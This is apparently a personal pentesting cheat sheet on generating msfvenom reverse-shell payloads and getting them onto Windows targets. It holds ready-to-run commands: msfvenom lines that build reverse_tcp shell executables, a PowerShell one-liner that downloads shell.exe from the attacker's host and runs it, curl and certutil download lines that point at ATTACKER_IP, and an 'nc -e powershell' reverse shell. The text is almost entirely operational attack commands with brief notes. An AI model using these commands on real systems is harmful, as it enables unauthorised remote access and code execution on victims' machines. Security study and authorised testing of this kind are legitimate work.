# MSFVENOM - autocrafting
> e.g. searching available payloads
```sh
msfvenom --list payloads | grep "linux/x86/meterpreter"
```

```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
notice
        -f format
        -o output_file
        -p payload os/arch/payload

shell/reverse_tcp is staged     (sometimes it says meterpreter instead of shell) 
shell_reverse_tcp is unstaged   (sometimes it says meterpreter instead of shell)
notice the /_ between shell reverse
        / is staged
        _ is not staged

> windows example
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<Listen_IP> LPORT=<Listen_Port> -f exe -o shell.exe 
```

# serving files to windows

> invoke web request is simliar to curl; shell is being hosted on attacker with python3
```
"powershell.exe Invoke-WebRequest -Uri http://<LHOST>:8000/shell.exe -OutFile ./shell.exe && .\shell.exe"
```

> Alternatively serve the shell with python on host and pull with curl/cert util on the target
```
curl http://ATTACKER_IP/reverse.exe -o "FULL_PATH"
certutil -urlcache -f http://ATTACKER_IP/FILE_TO_DOWNLOAD
```

## netcat
> nc traditional
```
nc ATTACKER_IP ATTACKER PORT -e powershell                      ; works just like other shells
```

